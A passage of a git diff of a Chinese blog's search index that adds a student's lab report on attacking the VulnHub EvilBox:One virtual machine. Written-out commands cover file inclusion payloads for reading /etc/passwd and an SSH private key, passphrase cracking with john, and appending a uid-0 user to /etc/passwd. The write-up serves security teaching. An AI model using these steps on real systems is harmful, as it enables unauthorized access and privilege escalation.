-<p>使用find命令按权限查找文件：<a href="https://www.iplayio.cn/post/596968725">https://www.iplayio.cn/post/596968725</a></p>
-</blockquote>
-<ul>
-<li><p>-o+w：查找其他用户有写权限的文件，（由于期望目标文件所有者是 root，我们目前的用户相对 root 即为 other users）；</p>
-</li>
-<li><p>-maxdepth：从根目录开始搜索的最大深度为3；</p>
-</li>
-<li><p>-print：将输出结果写入标准输出文件；</p>
-</li>
-<li><p>grep -v &#x2F;dev| grep -v &#x2F;sys | grep -v &#x2F;proc | grep -v &#x2F;boot | grep -v &#x2F;run：</p>
-<p>忽略以上目录下的搜索结果；</p>
-</li>
-<li><p>&gt; res.txt：将标准输出重定向为 res.txt 文件，即将筛选后的搜索结果保存在该文件中。</p>
-</li>
-</ul>
-<p>查看搜索结果，发现 <code>/etc/passwd</code> 文件竟然可以被其他用户写入：</p>
-<body style="text-align:left">
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173321185.png" alt="image-20221109173321185" width=700/>
-</body>
-</li>
-<li><p>进一步验证：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> /etc/passwd -al</span></span><br></pre></td></tr></table></figure>
-
-<body style="text-align:left">
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173503185.png" alt="image-20221109173503185" width=700 />
-</body>
-
-<p>发现我们确实具有写权限。</p>
-<p>设想如果我们在其中插入一条具有 root 权限的密码自定义的用户记录，切换到我们自定义的用户即可获取 root 权限。</p>
-</li>
-</ol>
-<h3 id="0x05-自定义-root-用户"><a href="#0x05-自定义-root-用户" class="headerlink" title="0x05. 自定义 root 用户"></a>0x05. 自定义 root 用户</h3><ol>
-<li><p>首先需要在 kali 上对我们自定义的密码进行加密。使用工具 <code>openssl</code>：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">openssl passwd</span></span><br></pre></td></tr></table></figure>
-
-<p>这里我输入的明文密码为 <code>test123</code>。<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109180626629.png" alt="image-20221109180626629"> </p>
-</li>
-<li><p>使用得到的密码密文，参照 passwd 文件中 root 用户的记录自定义一条用户记录：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>将该记录追加在 <code>/etc/passwd</code> 文件中：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>切换到用户 <code>test123</code>：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">su test123</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" alt="image-20221109181310735"> </p>
-<p>成功提权。</p>
-</li>
-<li><p>切换到 root 目录，发现第二个 Flag：</p>
-<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181455730.png" alt="image-20221109181455730"> </p>
-<p><strong>Flag2：</strong>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
-</li>
-</ol>
-<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><ul>
-<li><p><strong>Flag1：</strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
-</li>
-<li><p><strong>Flag2：</strong>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
-</li>
-<li><p><strong>root：</strong></p>
-<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" alt="image-20221109181310735"></p>
-</li>
+<li>任务一：<a href="#task1">点击跳转</a>；</li>
+<li>任务二：<a href="#task2">点击跳转</a>；</li>
+<li>任务三：<a href="#task3">点击跳转</a>。</li>
 </ul>
 <h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul>
-<li>根据发现的端口首先通过浏览器访问靶机的80端口，发现没有有效信息，考虑隐藏路径爆破；</li>
-<li>使用 <code>dirsearch</code> 爆破到存在 <code>/secret/</code> 路径，但是继续爆破无果。换用 <code>gobuster</code> 进行路径爆破，最终找到一个 PHP 文件 <code>evil.php</code>；</li>
-<li>直接访问返回空白页，推测其可能需要一个参数，使用 <code>ffuf</code> 进行参数名的爆破，最终发现存在文件包含漏洞；</li>
-<li>通过文件包含漏洞查看文件 <code>/etc/passwd</code>，发现一个可以登录的用户 <code>mowree</code>。使用 ssh 尝试登录发现该用户还支持私钥认证登录；</li>
-<li>通过文件包含漏洞获取靶机对应路径下的私钥，并使用 <code>john</code> 对私钥密码进行爆破；</li>
-<li>成功登入靶机后，发现当前用户对 <code>/etc/passwd</code> 文件具有写权限，添加一个具有 root 身份的密码自定义的用户记录；</li>
-<li>使用我们自定义的密码切换至上述自定义用户，成功获取 root 权限。</li>
+<li>本次实验靶机开发的端口很多，需要从扫描到的端口中寻找突破口。首先关注提供 web 应用的端口。</li>
+<li>浏览器访问 80 端口，未发现有效信息，进行路径爆破发现 <code>/blog</code> 路径，访问路径发现一个未加载样式的网页，并获得提示——靶机上存在某个服务端的备份文件。</li>
+<li>对 <code>/blog</code> 路径进行进一步爆破，发现某些路径被重定向到了某个域名的子路径上，尝试在 kali 的 hosts 文件中将该域名与靶机 IP 绑定。再次访问 <code>/blog</code> 路径，发现成功加载了样式。</li>
+<li>浏览器访问靶机 44441 端口，发现没有有效信息。对该端口进行域名爆破，发现一个隐藏的域名，同样将该域名与靶机 IP 进行绑定。再次访问后，发现当前页面可以对用户输入的 IP 地址进行 ping 操作。联想到命令注入。</li>
+<li>简单尝试注入后未果，拦截 ping 操作时发往服务器的请求头。发现网页将用户输入的 IP 地址包装成了一个对象，并做了序列化操作。但由于不知道服务端解析对象的方式，故无法直接进行命令注入。</li>
+<li>联想到 80 端口 <code>/blog</code> 路径下的提示，尝试通过路径、文件爆破寻找靶机上的备份文件。</li>
+<li>找到备份文件后，下载至 kali 查看，推测是 ping 操作页面服务端的源码。根据该源码中的对象解析方式，构造注入对象的序列，实现合法性绕过以及命令的注入，最终成功获取反弹 shell。</li>
+<li>使用 <code>pspy</code> 工具查看靶机上运行的进程，找到一个以 root 身份运行的 shell 脚本进程。查看相关脚本，发现该脚本将指定目录下的所有文件的所有者更改为了反弹 shell 中的当前用户。</li>
+<li>尝试在该目录下建立 passwd 文件的链接，使该脚本更改 passwd 文件的所有者，最终获取对 passwd 文件的写入权限。</li>
+<li>使用与实验八相同的操作自定义一条 root 用户记录，并插入 passwd 文件。</li>
+<li>切换至自定义用户，完成提权！</li>
 </ul>
-<h2 id="五、思路拓展"><a href="#五、思路拓展" class="headerlink" title="五、思路拓展"></a>五、思路拓展</h2><ol>
-<li><p>对于一个文件包含漏洞，可以首先尝试有没有远程文件包含漏洞，如果有即可让其执行 kali 的 web 服务上的一句话木马或反弹 shell 等攻击脚本。（本次实验中不存在该漏洞）</p>
-</li>
-<li><p>也可以考虑先编码，再通过文件包含漏洞读出编码后的 PHP 代码，可以实现避免执行代码而是读取代码的内容。这里可以尝试将 <code>evil.php</code> 读出：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==</code></li>
-</ul>
-</li>
-<li><p>通过 <a href="https://icyberchef.com/">icyberchef</a> 进行解码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>成功获取到 <code>evil.php</code> 的源码。</p>
-</li>
-<li><p>尝试进行写入，如果成功则可以通过此漏洞写入一句话木马脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=php://filter/write=convert.base64-</span><br><span class="line">decode/resource=test.php&amp;txt=MTIz</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>尝试访问预期生成的文件，发现返回404，说明该方法在当前靶机上不可用。但也是一种漏洞利用的好思路。</p>
-</li>
-</ol>
+<p>ps：实验报告中只展示了成功的思路，但是在实际的渗透测试中，往往需要我们对多个漏洞点进行尝试，才能找到有效的突破口。</p>
 ]]></content>
       <categories>
         <category>网络攻防实战</category>
@@ -2454,7 +2189,7 @@
     <url>/vulnhub-Fawkes/</url>
     <content><![CDATA[<blockquote>
 <p>网络攻防实战 第七次实验</p>
-<p>邮箱：<a href="mailto:&#x6b;&#x65;&#x65;&#107;&#107;&#x65;&#119;&#121;&#64;&#x71;&#113;&#46;&#99;&#111;&#109;">&#x6b;&#x65;&#x65;&#107;&#107;&#x65;&#119;&#121;&#64;&#x71;&#113;&#46;&#99;&#111;&#109;</a></p>
+<p>邮箱：<a href="mailto:&#x6b;&#101;&#101;&#107;&#107;&#x65;&#119;&#121;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109;">&#x6b;&#101;&#101;&#107;&#107;&#x65;&#119;&#121;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109;</a></p>
 <p>2022年11月2日</p>
 <p>靶机连接：<a href="https://vulnhub.com/entry/harrypotter-fawkes,686/">https://vulnhub.com/entry/harrypotter-fawkes,686/</a></p>
 </blockquote>
@@ -2871,11 +2606,263 @@
       </tags>
   </entry>
   <entry>
+    <title>【渗透测试】第八周 vulnhub-EvilBox:One</title>
+    <url>/vulnhub-EvilBoxOne/</url>
+    <content><![CDATA[<blockquote>
+<p>网络攻防实战 第八次实验</p>
+<p>邮箱：<a href="mailto:&#107;&#x65;&#101;&#107;&#x6b;&#x65;&#x77;&#121;&#x40;&#x71;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#107;&#x65;&#101;&#107;&#x6b;&#x65;&#x77;&#121;&#x40;&#x71;&#x71;&#x2e;&#x63;&#111;&#x6d;</a></p>
+<p>2022年11月8日</p>
+<p>靶机链接：<a href="https://vulnhub.com/entry/evilbox-one,736/">https://vulnhub.com/entry/evilbox-one,736/</a></p>
+</blockquote>
+<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>取得目标靶机的 root 权限并获得两个 flag。</p>
+<p>我们将使用到以下攻击手段：</p>
+<ul>
+<li>主机发现、端口扫描</li>
+<li>隐藏路径爆破</li>
+<li>参数名爆破</li>
+<li>文件包含漏洞的发现以及利用</li>
+<li>SSH 登入</li>
+<li>私钥密码爆破</li>
+<li>特定权限文件的发现</li>
+<li>添加自定义用户记录</li>
+</ul>
+<h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote>
+<p>kali: 10.0.2.15</p>
+<p>靶机: 10.0.2.12</p>
+</blockquote>
+<h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol>
+<li><p>获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.12 -A</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211601033.png" alt="image-20221108211601033" />  
+</li>
+<li><p>访问80端口发现是一个 <code>Apache2 Debian</code> 的默认页面，没有对渗透有帮助的信息：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211801201.png" alt="image-20221108211801201"  /></li>
+</ol>
+<h3 id="0x01-隐藏路径爆破"><a href="#0x01-隐藏路径爆破" class="headerlink" title="0x01. 隐藏路径爆破"></a>0x01. 隐藏路径爆破</h3><ol>
+<li><p>首先使用 <code>dirsearch</code> 进行路径爆破：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108212228720.png" alt="image-20221108212228720" /> 
+
+<p>找到了隐藏路径 <code>/secret/</code> 和隐藏文件 <code>robots.txt</code>。</p>
+<p>分别访问均没有获得有效信息。</p>
+<p>ps：<a href="https://blog.csdn.net/qq_41092170/article/details/117701816">robots.txt</a></p>
+</li>
+<li><p>对 <code>/secret/</code> 做进一步路径爆破：</p>
+<p>直接使用 <code>dirsearch</code> 由于字典限制无法找到更多信息，此处使用 <code>gobuster</code> 进行爆破。</p>
+<blockquote>
+<p>安装：apt install gobuster</p>
+<p>安装字典：apt install seclists</p>
+<p>渗透测试要尝试掌握多种工具</p>
+</blockquote>
+<p>使用指定字典进行路径爆破：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gobuster <span class="built_in">dir</span> -u http://10.0.2.12/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108213853527.png" alt="image-20221108213853527" />  
+
+<p>除了主页文件之外，还发现一个 PHP 文件 <code>evil.php</code>。直接通过 url 访问该文件发现只有一个空白页面，猜测可能需要通过 <code>GET</code> 方法提供一个参数（即在 url 后添加某个参数）。</p>
+</li>
+</ol>
+<h3 id="0x02-参数名爆破"><a href="#0x02-参数名爆破" class="headerlink" title="0x02. 参数名爆破"></a>0x02. 参数名爆破</h3><p>使用 <code>ffuf</code> 工具对该参数键值对（参数名和对应的值）进行爆破：</p>
+<ol>
+<li><p>首先期望存在命令注入漏洞：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM  -u http://10.0.2.12/secret/evil.php?PARAM=<span class="built_in">ls</span> -fs 0</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>选择字典文件 burp-parameter-names.txt 作为参数名；</li>
+<li>命令 <code>ls</code> 作为参数值。</li>
+</ul>
+<p>进行爆破后，为获得有效结果，爆破失败。</p>
+</li>
+<li><p>期望存在文件包含漏洞：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM  -u http://10.0.2.12/secret/evil.php?PARAM=../index.html -fs 0</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>选择字典文件 burp-parameter-names.txt 作为参数名；</li>
+<li>已知存在的主页文件的路径作为参数值。</li>
+</ul>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225352732.png" alt="image-20221108225352732" /> 
+
+<p>爆破成功，结果显示需要提供的参数名为 <code>command</code> 。</p>
+</li>
+<li><p>查看靶机文件验证漏洞存在：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>查看返回页面源码：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225808433.png" alt="image-20221108225808433" width=300% /> 
+
+<p>读取了靶机上的 <code>/etc/passwd</code> 文件，确认存在文件包含漏洞。</p>
+</li>
+</ol>
+<h3 id="0x03-SSH-私钥密码爆破"><a href="#0x03-SSH-私钥密码爆破" class="headerlink" title="0x03. SSH 私钥密码爆破"></a>0x03. SSH 私钥密码爆破</h3><ol>
+<li><p>通过分析上述文件内容，发现靶机中除 root 用户外还存在一个 <code>mowree</code> 用户拥有登录权限，其主目录为 <code>/home/mowree</code>.尝试获取其被允许的 SSH 登录方式：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh mowree@10.0.2.12 -v    <span class="comment"># debug模式</span></span></span><br></pre></td></tr></table></figure>
+
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109091744345.png" alt="image-20221109091744345" width=300% />
+
+<p>发现除了允许输入对应密码登录外还可以使用密钥登录。</p>
+</li>
+<li><p>通过文件包含漏洞查看靶机上该用户的私钥：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=/home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109092317615.png" alt="image-20221109092317615" width=300% /> 
+
+<p>将其保存在文件 <code>id_rsa</code> 中。 </p>
+</li>
+<li><p>使用指定私钥登录靶机：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ssh mowree@10.0.2.12 -i id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>发现需要输入私钥的密码：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093513763.png" alt="image-20221109093513763" /> 
+
+<p>考虑对其进行爆破。  </p>
+<p>如果出现报错：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093055156.png" alt="image-20221109093055156" /> 
+
+<p>这是说密钥文件权限不能为0644，0644权限太开放了，要求你的密钥文件不能被其它用户读取。</p>
+<p>修改权限为7000即可：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> 7000 id_rsa</span></span><br></pre></td></tr></table></figure>
+
+<p>参考：<a href="https://blog.csdn.net/Figure_hb/article/details/90754146">https://blog.csdn.net/Figure_hb/article/details/90754146</a></p>
+</li>
+<li><p>将密钥文件转换为 <code>john</code> 可用的 hash 文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /usr/share/john/ssh2john.py ./id_rsa &gt; id_rsa.hash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用 <code>john</code> 进行爆破：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">john id_rsa.hash --wordlist=rockyou.txt</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>该字典文件可通过在 kali 上使用 locate 指令搜索得到</p>
+</blockquote>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109094836969.png" alt="image-20221109094836969" /> 
+
+<p>成功获取私钥密码 <code>unicorn</code>。</p>
+</li>
+<li><p>成功登入靶机：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109095933335.png" alt="image-20221109095933335" /></li>
+</ol>
+<h3 id="0x04-信息收集"><a href="#0x04-信息收集" class="headerlink" title="0x04. 信息收集"></a>0x04. 信息收集</h3><ol>
+<li><p>查看当前目录下的文件，获取第一个 Flag：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109100516303.png" alt="image-20221109100516303" /> 
+
+<p><strong>Flag1：</strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
+</li>
+<li><p>当前用户路径下没有其他有价值的文件，在靶机上寻找用户可以写入的文件：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -perm -o+w -maxdepth 3 -<span class="built_in">print</span> | grep -v /dev| grep -v /sys | grep -v /proc | grep -v /boot | grep -v /run &gt; res.txt</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>find指令的使用：<a href="https://blog.csdn.net/m0_46674735/article/details/112390027">https://blog.csdn.net/m0_46674735/article/details/112390027</a></p>
+<p>使用find命令按权限查找文件：<a href="https://www.iplayio.cn/post/596968725">https://www.iplayio.cn/post/596968725</a></p>
+</blockquote>
+<ul>
+<li><p>-o+w：查找其他用户有写权限的文件，（由于期望目标文件所有者是 root，我们目前的用户相对 root 即为 other users）；</p>
+</li>
+<li><p>-maxdepth：从根目录开始搜索的最大深度为3；</p>
+</li>
+<li><p>-print：将输出结果写入标准输出文件；</p>
+</li>
+<li><p>grep -v &#x2F;dev| grep -v &#x2F;sys | grep -v &#x2F;proc | grep -v &#x2F;boot | grep -v &#x2F;run：</p>
+<p>忽略以上目录下的搜索结果；</p>
+</li>
+<li><p>&gt; res.txt：将标准输出重定向为 res.txt 文件，即将筛选后的搜索结果保存在该文件中。</p>
+</li>
+</ul>
+<p>查看搜索结果，发现 <code>/etc/passwd</code> 文件竟然可以被其他用户写入：</p>
+<body style="text-align:left">
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173321185.png" alt="image-20221109173321185" width=700/>
+</body>
+</li>
+<li><p>进一步验证：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> /etc/passwd -al</span></span><br></pre></td></tr></table></figure>
+
+<body style="text-align:left">
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173503185.png" alt="image-20221109173503185" width=700 />
+</body>
+
+<p>发现我们确实具有写权限。</p>
+<p>设想如果我们在其中插入一条具有 root 权限的密码自定义的用户记录，切换到我们自定义的用户即可获取 root 权限。</p>
+</li>
+</ol>
+<h3 id="0x05-自定义-root-用户"><a href="#0x05-自定义-root-用户" class="headerlink" title="0x05. 自定义 root 用户"></a>0x05. 自定义 root 用户</h3><ol>
+<li><p>首先需要在 kali 上对我们自定义的密码进行加密。使用工具 <code>openssl</code>：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">openssl passwd</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我输入的明文密码为 <code>test123</code>。<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109180626629.png" alt="image-20221109180626629"> </p>
+</li>
+<li><p>使用得到的密码密文，参照 passwd 文件中 root 用户的记录自定义一条用户记录：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将该记录追加在 <code>/etc/passwd</code> 文件中：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>切换到用户 <code>test123</code>：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">su test123</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" alt="image-20221109181310735"> </p>
+<p>成功提权。</p>
+</li>
+<li><p>切换到 root 目录，发现第二个 Flag：</p>
+<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181455730.png" alt="image-20221109181455730"> </p>
+<p><strong>Flag2：</strong>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
+</li>
+</ol>
+<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><ul>
+<li><p><strong>Flag1：</strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
+</li>
+<li><p><strong>Flag2：</strong>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
+</li>
+<li><p><strong>root：</strong></p>
+<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" alt="image-20221109181310735"></p>
+</li>
+</ul>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul>
+<li>根据发现的端口首先通过浏览器访问靶机的80端口，发现没有有效信息，考虑隐藏路径爆破；</li>
+<li>使用 <code>dirsearch</code> 爆破到存在 <code>/secret/</code> 路径，但是继续爆破无果。换用 <code>gobuster</code> 进行路径爆破，最终找到一个 PHP 文件 <code>evil.php</code>；</li>
+<li>直接访问返回空白页，推测其可能需要一个参数，使用 <code>ffuf</code> 进行参数名的爆破，最终发现存在文件包含漏洞；</li>
+<li>通过文件包含漏洞查看文件 <code>/etc/passwd</code>，发现一个可以登录的用户 <code>mowree</code>。使用 ssh 尝试登录发现该用户还支持私钥认证登录；</li>
+<li>通过文件包含漏洞获取靶机对应路径下的私钥，并使用 <code>john</code> 对私钥密码进行爆破；</li>
+<li>成功登入靶机后，发现当前用户对 <code>/etc/passwd</code> 文件具有写权限，添加一个具有 root 身份的密码自定义的用户记录；</li>
+<li>使用我们自定义的密码切换至上述自定义用户，成功获取 root 权限。</li>
+</ul>
+<h2 id="五、思路拓展"><a href="#五、思路拓展" class="headerlink" title="五、思路拓展"></a>五、思路拓展</h2><ol>
+<li><p>对于一个文件包含漏洞，可以首先尝试有没有远程文件包含漏洞，如果有即可让其执行 kali 的 web 服务上的一句话木马或反弹 shell 等攻击脚本。（本次实验中不存在该漏洞）</p>
+</li>
+<li><p>也可以考虑先编码，再通过文件包含漏洞读出编码后的 PHP 代码，可以实现避免执行代码而是读取代码的内容。这里可以尝试将 <code>evil.php</code> 读出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==</code></li>
+</ul>
+</li>
+<li><p>通过 <a href="https://icyberchef.com/">icyberchef</a> 进行解码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功获取到 <code>evil.php</code> 的源码。</p>
+</li>
+<li><p>尝试进行写入，如果成功则可以通过此漏洞写入一句话木马脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=php://filter/write=convert.base64-</span><br><span class="line">decode/resource=test.php&amp;txt=MTIz</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>尝试访问预期生成的文件，发现返回404，说明该方法在当前靶机上不可用。但也是一种漏洞利用的好思路。</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络攻防实战</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>Kali</tag>
+        <tag>网络</tag>
+        <tag>安全</tag>
+        <tag>Linux</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【渗透测试】第九周 vulnhub-DoubleTrouble:1</title>
     <url>/vulnhub-doubletrouble/</url>
     <content><![CDATA[<blockquote>
 <p>网络攻防实战 第九次实验</p>
-<p>邮箱：<a href="mailto:&#x6b;&#x65;&#101;&#x6b;&#107;&#x65;&#x77;&#x79;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;">&#x6b;&#x65;&#101;&#x6b;&#107;&#x65;&#x77;&#x79;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;</a></p>
+<p>邮箱：<a href="mailto:&#x6b;&#101;&#x65;&#x6b;&#x6b;&#x65;&#x77;&#121;&#64;&#113;&#113;&#46;&#99;&#111;&#x6d;">&#x6b;&#101;&#x65;&#x6b;&#x6b;&#x65;&#x77;&#121;&#64;&#113;&#113;&#46;&#99;&#111;&#x6d;</a></p>
 <p>靶机链接：<a href="https://www.vulnhub.com/entry/doubletrouble-1,743/">https://www.vulnhub.com/entry/doubletrouble-1,743/</a></p>
 <p>2022年11月15日</p>
 </blockquote>
@@ -3138,7 +3125,7 @@
 <p>第一周</p>
 <p>可弟WZ</p>
 <p>主页：blog.kekwy.com</p>
-<p>邮箱：<a href="mailto:&#107;&#101;&#101;&#x6b;&#107;&#x65;&#x77;&#x79;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#107;&#101;&#101;&#x6b;&#107;&#x65;&#x77;&#x79;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a></p>
